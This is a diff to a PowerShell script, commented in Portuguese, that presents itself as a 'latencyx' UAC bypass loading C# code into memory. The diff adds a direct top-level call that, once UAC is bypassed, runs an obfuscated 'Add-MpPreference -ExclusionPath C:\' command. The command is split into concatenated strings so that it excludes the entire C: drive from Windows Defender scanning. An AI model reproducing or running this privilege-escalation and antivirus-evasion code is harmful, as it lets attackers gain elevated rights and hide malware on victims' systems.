@@ -17,15 +17,8 @@ Este script usa código em C# para ser carregado na memória com PowerShell usan
 
 .EXAMPLE
 
-latencyx-Invoke-UAC -Executable "powershell" -Command ".('Add-MpP' + 'reference') -ExclusionPath C:\"
+latencyx-Invoke-UAC -Executable "powershell" -Command ".('Add-MpP' + 'reference') -ExclusionPath C:\" 
 
-.EXAMPLE
-
-latencyx-Invoke-UAC -Executable "cmd"
-
-.NOTES
-
-Este script foi inspirado em técnicas de elevação de privilégios, personalizadas para a funcionalidade `latencyx` UAC Bypass.
 #>
 
 param(
@@ -202,7 +195,9 @@ if ($latencyxProcess -eq "cmstp") {
     }
 } else {
     latencyxExecute
-latencyx-Invoke-UAC -Executable "powershell" -Command ".('Add-MpP' + 'reference') -ExclusionPath C:\"
+}
 
 }
-}
+
+# Agora fora da função, você pode chamar diretamente a função com o comando desejado:
+latencyx-Invoke-UAC -Executable "powershell" -Command ".('Add-MpP' + 'reference') -ExclusionPath C:\"
